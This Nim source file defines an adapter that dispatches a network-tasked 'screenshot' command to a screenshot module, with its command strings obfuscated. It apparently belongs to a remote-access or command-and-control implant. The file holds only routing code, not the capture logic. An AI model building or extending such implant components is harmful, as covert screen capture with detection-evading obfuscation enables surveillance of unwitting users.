#[
    Adapter: ScreenshotCommandAdapter
    Wraps screenshot modules (screenshot)
    Implements CommandModulePort to normalize interfaces
    Applies Dependency Inversion Principle
]#

import options
import ../../../domain/models/network_command_context
import ../../modules/screenshot/screenshot
from ../string_obfuscation_adapter import obf

type
    ScreenshotCommandAdapter* = object
        ## Adapter for screenshot command modules
        discard

proc newScreenshotCommandAdapter*(): ScreenshotCommandAdapter =
    ## Create a new ScreenshotCommandAdapter instance
    result = ScreenshotCommandAdapter()

proc executeCommand*(adapter: ScreenshotCommandAdapter, cmd: string, args: seq[string], cmdGuid: string, ctx: Option[NetworkCommandContext]): string =
    ## Execute a screenshot command
    case cmd:
    of obf("screenshot"):
        result = screenshot(args)
    else:
        result = obf("ERROR: Unknown screenshot command: ") & cmd

